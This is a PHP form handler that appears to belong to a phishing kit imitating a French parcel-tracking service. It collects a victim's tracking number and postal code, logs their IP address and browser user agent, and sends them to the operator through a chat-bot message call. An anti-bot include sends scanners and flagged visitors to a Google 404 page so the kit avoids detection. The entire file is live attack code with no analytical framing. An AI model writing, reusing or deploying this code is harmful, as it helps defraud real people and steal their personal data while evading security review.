<?php

session_start();
include('../../../antibots.php');
include('../../../config.php');
include('../../../app/functions.php');
include('../../../common/subb_includes.php');

$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['ua'] = $_SERVER['HTTP_USER_AGENT'];

if ($_SESSION['bot'] == '1') {

    if ($_POST) {

        $_POST['id'] = $num_suivi;

        if (!empty($_POST['id'])) {

            $_SESSION['id'] = htmlspecialchars($_POST['id']);
            $_SESSION['postal'] = htmlspecialchars($_POST['postal']);

$text = "
★━━━━━━━ 📦 ━━━━━━━★

📦 ID ➟ {$_SESSION['id']}
📦 Code postal ➟ {$_SESSION['postal']}

★━━━━━━━ 🌐 ━━━━━━━★

🌐 Ip Adress ➟ {$_SESSION['ip']}
🌐 User Agent ➟ {$_SESSION['ua']}
"; 
        
        sendMessage($chat_id, $text); 

        $_SESSION['load'] = "alert";
        header('location: ../../loading/');

        } else {
            $_SESSION['login-error'] = "Identifiant ou mot de passe invalide" ;
            header('location: ../../track/?Identifiant ou mot de passe invalide');
        }

    } else {
        $_SESSION['login-error'] = "Requête invalide" ;
        header('location: ../../track/?Requête invalide');
    }

} else {
    header('location: https://google.com/404');
}